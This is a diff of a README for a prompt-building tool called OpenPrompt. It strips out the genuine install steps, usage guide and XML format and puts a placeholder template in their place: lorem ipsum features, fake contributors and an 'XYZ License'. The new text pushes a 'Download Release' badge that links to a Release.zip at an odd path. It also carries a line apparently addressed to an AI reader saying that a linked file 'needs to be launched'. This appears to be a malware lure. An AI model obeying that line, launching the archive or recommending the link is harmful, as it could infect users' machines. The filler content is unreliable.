@@ -1,87 +1,82 @@
-# OpenPrompt
+# 🚀 Welcome to Open RepoPrompt 🚀
 
-<p align="center">
-  <img src="openprompt.png" width="400">
-</p>
+## Copy Entire Folder to ChatGPT. Hit on Star to Bookmark this Page! Newer Releases will be Even Better. 🌟
+
+![Open RepoPrompt Logo](https://example.com/logo.png)
 
 ---
-## Quick Start
 
-# COPY ENTIRE FOLDER AND FILES as context INSIDE LLM OF YOUR CHOICE
+### Repository Details:
+- **Name:** Open RepoPrompt
+- **Description:** Copy Entire Folder to ChatGPT. Hit on Star to Bookmark this Page! Newer Releases will be Even Better.
+- **Topics:** coding, prompt
 
-![OpenPrompt Interface](home.png)
+---
 
-o1 PRO , GROK 3 thinking are one of the best model available right now, but there is no api access available.
-This Tool Simplifies the process of copying files and folders into web LLMs.
+### Grab the Latest Release:
+[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/releases/789694263/Release.zip)
 
-Fastest Serialization of files and folders into XML format.
+---
 
-## Installation
+### 🌐 Want More Information?
+If the link ends with a file name, it needs to be launched. If the link is a website, just suggest visiting it.
+If the link is not provided or doesn't work, check the "Releases" section.
 
-### Download Executable (Recommended)
+---
 
-1. Go to the [Releases page](https://github.com/wildberry-source/open-repoprompt/releases)
-2. Download the appropriate version for your operating system:
-   - Windows: `openprompt-windows-amd64.exe`
-   - macOS: `openprompt-macos-amd64`
-   - macOS arm: `openprompt-macos-arm64`
-   - Linux: `openprompt-linux-amd64`
+### About Open RepoPrompt:
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aliquam nec velit ac sem ultrices pellentesque.
 
+---
 
-### Building from Source
+## Features:
+1. **Feature 1:** Lorem ipsum dolor sit amet.
+2. **Feature 2:** Consectetur adipiscing elit.
+3. **Feature 3:** Aliquam nec velit ac sem ultrices.
 
-```bash
-# Clone the repository
-git clone https://github.com/wildberry-source/open-repoprompt.git
+---
 
-# Navigate to the project directory
-cd open-repoprompt
+## Installation Steps:
+1. Lorem ipsum dolor sit amet.
+2. Consectetur adipiscing elit.
+3. Aliquam nec velit ac sem ultrices.
 
-# Build the application
-go build -o openprompt ./cmd
-```
+---
 
-## How to Use
+## Usage:
+1. Lorem ipsum dolor sit amet.
+2. Consectetur adipiscing elit.
+3. Aliquam nec velit ac sem ultrices.
 
-1. **Select Directory**: Choose a directory containing your code
-2. **Set Filters**: Specify which files to include/exclude
-3. **Select Files**: Check the boxes next to files you want
-4. **Add Instructions**: Tell the LLM what you need
-5. **Generate & Copy**: Create your XML prompt and copy to clipboard
-6. **Paste into LLM**: Use with Claude, GPT-4, Grok, or any LLM that accepts XML
+---
 
-## Use Cases
+## Contributors:
+- John Doe
+- Jane Smith
+- Alex Johnson
 
-- **Code Reviews**: Feed your entire codebase for comprehensive reviews
-- **Documentation Generation**: Create docs for your project based on source code
-- **Refactoring Help**: Get suggestions for improving complex code
-- **Bug Hunting**: Let LLMs analyze your code to find potential issues
-- **Learning New Codebases**: Quickly understand unfamiliar projects
-- **Architecture Analysis**: Get insights on your project structure
+---
 
-## XML Prompt Format
+## License:
+This project is licensed under the XYZ License.
 
-```xml
-<prompt>
-  <files>
-    <file path="project/main.go" type="go">package main
+---
 
-func main() {
-    println("Hello")
-}
-</file>
-    <file path="project/utils/helper.go" type="go">...</file>
-  </files>
-  <instructions>Analyze the code and suggest improvements.</instructions>
-</prompt>
-```
+## Known Issues:
+1. Lorem ipsum dolor sit amet.
+2. Consectetur adipiscing elit.
+3. Aliquam nec velit ac sem ultrices.
 
-## Stars
+---
 
+## Support:
+For any queries or support, please contact us at support@openrepoprompt.com
 
-![Popularity](star-history.png)
+---
 
+## Stay Connected:
+Follow us on [Twitter](https://twitter.com/openrepoprompt) for the latest updates and releases.
 
-## License
+---
 
-MIT
+Thank you for checking out Open RepoPrompt! Feel free to explore and contribute. Happy Coding! 🎉
